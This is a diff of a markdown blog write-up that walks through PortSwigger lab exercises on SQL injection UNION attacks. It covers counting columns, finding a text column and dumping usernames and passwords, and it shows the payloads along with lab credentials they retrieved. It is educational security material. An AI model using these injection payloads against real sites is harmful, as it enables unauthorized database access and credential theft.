@@ -1,24 +1,24 @@
 ---
-title: SQL UNION Attack
-date: 2026-03-20
-readTime: 8 min
+title: SQL Injection UNION Attack
+date: 2026-03-15
+readTime: 12 min
 category: writeup
-description: Exploiting SQL UNION operator to retrieve data from other database tables.
+description: A comprehensive guide to SQL injection UNION attacks, from determining column counts to retrieving sensitive data.
 icon: 💉
 coverImage: ""
 ---
 
-# SQL UNION Attack
+# Union ATTACKS SQL
 
-## Retrieving data from other database tables
+## **Retrieving data from database tables**
 
-```sql
-SELECT id, name FROM employees
-UNION
-SELECT id, name FROM managers;
-```
+![Untitled](/writeup_image/Untitled.png)
 
-The **UNION** operator combines result sets from multiple SELECT statements.
+`SELECT id, name FROM employees`
+`<span color="green">UNION combines both lists.</span>`
+`SELECT id, name FROM managers;`
+
+![Untitled](/writeup_image/Untitled%201.png)
 
 ## SQL injection **UNION** attack
 
@@ -30,7 +30,9 @@ After going to the **Labs** category, the lab already says there is a vulnerabil
 
 The goal is to determine the number of columns by testing a row containing `NULL` values.
 
-For example, let's take a random table with columns:
+For example, let's take a random table:
+
+![Untitled](/writeup_image/Untitled%202.png)
 
 In the first row, we can see `id`, `name`, and `age`. On the server, this random table might have a query like:
 
@@ -40,17 +42,19 @@ This table name is `users`.
 
 **Now, in our case:**
 
-We don’t know the rows or the columns in the lab, but we know our query is similar to the example above.
+We don't know the rows or the columns in the lab, but we know our query is similar to the example above.
 
 As we already know, UNION helps to combine result lists.
 
 Logically, we will use `UNION` with `SELECT`.
 
-I chose the **Gifts category** as the target.
+I chose the **Gifts category**:
+
+![Untitled](/writeup_image/Untitled%203.png)
 
 Now we need to find the number of columns by testing `NULL` values.
 
-# **Lab: SQL injection UNION attack**
+### Lab 1 :Determining the number of columns returned by the query
 
 **Initial SQL injection**:
 
@@ -77,7 +81,7 @@ UNION SELECT NULL, NULL, NULL --;
 - The first **`SELECT`** retrieves **`id`**, **`name`**, and **`price`** from the **`products`** table where the category is **`'Gifts'`**.
 - The second **`SELECT`** (**`SELECT NULL, NULL, NULL`**) creates a result set with a single row of **`NULL`** values for each of the three columns.
 - **Purpose**: The purpose of the second **`SELECT`** is to add a row of `NULL` values to the combined result set. It does **not** change the rows returned by the first `SELECT`. It simply appends an extra row.
-- **Note**: `NULL` means “no value”. It is not a string, integer, or variable.
+- **Note**: `NULL` means "no value". It is not a string, integer, or variable.
 
 ```
 SELECT NULL, NULL, NULL, NULL--
@@ -92,7 +96,7 @@ This will give an error. If you see an error with 4 `NULL` values, it means the 
 
 So the correct query is:
 
-filter?category=Gifts’UNION+SELECT+NULL,NULL,NULL—
+filter?category=Gifts'UNION+SELECT+NULL,NULL,NULL—
 
 If you want to change the order of the list, you can do:
 
@@ -100,21 +104,21 @@ If you want to change the order of the list, you can do:
 
 Because `ORDER BY 1` might refer to a column that is not visible in the list, you may not see a change, but the injection is working.
 
+![Untitled](/writeup_image/Untitled%204.png)
 
-
-[https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts' ORDER BY 2--](https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts%27%20ORDER%20BY%201--)
+[https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts' ORDER BY 2--](https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts%27%20ORDER%20BY%202--)
 
 `ORDER BY 2` is in **alphabetical order**.
 
+![Untitled](/writeup_image/Untitled%205.png)
 
-
-[https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts' ORDER BY 3--](https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts%27%20ORDER%20BY%201--)
+[https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts' ORDER BY 3--](https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts%27%20ORDER%20BY%203--)
 
 It is in ascending order of the price.
 
+![Untitled](/writeup_image/Untitled%206.png)
 
-
-## **Database-specific syntax**
+### **Database-specific syntax**
 
 In an Oracle database, every SELECT query must use the FROM keyword and specify a **valid table**.
 
@@ -127,19 +131,19 @@ In an Oracle database, every SELECT query must use the FROM keyword and specify 
 
 `' UNION SELECT NULL FROM DUAL--`
 
-Let’s break down this query:
+Let's break down this query:
 
 - UNION is used to combine two or more `SELECT` statements.
 - Each `SELECT` statement in a `UNION` must have the same number of columns.
 - `SELECT NULL FROM DUAL`: This selects a `NULL` value from the `DUAL` table. Since `DUAL` contains exactly one row, this returns a single row with a single `NULL` value.
 
-## Lab 2: Finding a column containing text
-
+### Lab 2 :Finding a column containing text
+ 
 `category=Lifestyle'+UNION+SELECT+NULL,'0xToAs',NULL—`
 
 So, the executable string data type in the column was the 2nd column.
 
-If you don’t understand how, here’s an example layout:
+If you don't understand how, here's an example layout:
 
 ```sql
 | Column1 | Column2 | Column3 |
@@ -151,11 +155,11 @@ If you don’t understand how, here’s an example layout:
 
 By looking at this table, we can say the database results might look like this. The string `'0xToAs'` was only executable in `Column2`.
 
-# **If you did not understand this yet, here is a summary of #Lab 1 and #Lab 2**
+# **Still doubt, here is a summary of Lab 1 and Lab 2**
 
 - By solving the second lab, we learned that a string data type can only be executed in the second column. #Lab 1 and #Lab 2 are connected. Summary below.
     
-    The query for the first lab was `‘UNION+SELECT+NULL+NULL+NULL’`, and it executed successfully. We learned that there are actually 3 columns. After using this query, the results look like:
+    The query for the first lab was `'UNION+SELECT+NULL+NULL+NULL'`, and it executed successfully. We learned that there are actually 3 columns. After using this query, the results look like:
     
     ```jsx
     | Column1 | Column2 | Column3 |
@@ -171,40 +175,37 @@ By looking at this table, we can say the database results might look like this. 
     - `category=Lifestyle'+UNION+SELECT+'0xToAs',NULL,NULL—` #internal error
     - `category=Lifestyle'+UNION+SELECT+NULL,'0xToAs',NULL—` #successful
     - `category=Lifestyle'+UNION+SELECT+NULL,NULL,'0xToAs'—` #internal error
-    
 
 # **Using a SQL injection UNION attack to retrieve interesting data**
 
 In this `UNION` attack, we will use the experience and skills we learned before to access the administrator portal.
 
-## **Lab:** [**SQL injection UNION**](https://portswigger.net/web-security/sql-injection/union-attacks) attack, retrieving data from other tables
+### Lab: SQL injection UNION attack, retrieving data from other tables
 
-Using: `‘UNION SELECT username,password FROM users—`
+Using: `'UNION SELECT username,password FROM users—`
 
-
-
-[**Examining the database in** [**SQL injection**](https://portswigger.net/web-security/sql-injection) **attacks**](Union%20ATTACKS%20SQL/Examining%20the%20database%20in%20SQL%20injection%20attacks%20ff5eb12126ff4688a7fc416ed2baaf5e.md)
+![Untitled](/writeup_image/Untitled%207.png)
 
 # **Retrieving multiple values within a single column**
 
 Unlike the previous query, which was used to retrieve a single value, we will now use a query that retrieves multiple values within a single column.
 
-## **Lab:** [**SQL injection UNION**](https://portswigger.net/web-security/sql-injection/union-attacks) attack, retrieving multiple values in a single column
+### **Lab:** SQL injection UNION attack, retrieving multiple values in a single column
 
-
+![Untitled](/writeup_image/Untitled%208.png)
 
 After using this query, we successfully retrieved many values in a single column:
 
 **`Pets' UNION SELECT NULL,username ||'~'|| password  FROM users--`**
 
 Breakdown:
-
-| Column1 | Column2 |
-| --- | --- |
-| 1 | administrator~i18q3v7h0ybmvfaplx9o |
-| 2 | Giant Grasshopper |
-| NULL | carlos~pc5cv35gswgctmbvjif7 |
-|  |  |
+```txt
+| Column1           | Column2                             |
+| ------------------|-------------------------------------|
+| 1                 |  administrator~i18q3v7h0ybmvfaplx9o |
+| 2                 | Giant Grasshopper                   |
+| NULL              | carlos~pc5cv35gswgctmbvjif7         |
+```
 
 The table above shows what the results might look like.
 
@@ -213,3 +214,11 @@ The administrator and password are in the same column, separated by ~.
 NULL is a placeholder for Column1.
 
 `username` and `password` are just variables. Everything should be clear now.
+
+# Conclusion
+
+SQL injection UNION attacks are a powerful technique for extracting sensitive data from vulnerable databases. By understanding how to determine column counts, identify data types, and retrieve information from multiple tables, you can effectively exploit SQL injection vulnerabilities during penetration testing and security assessments. Always remember to practice these techniques in authorized environments like Portswigger Labs, and use this knowledge responsibly to help secure applications.
+
+---
+
+**Follow:** [@dodgenefoli](https://twitter.com/dodgenefoli) **On Twitter !**
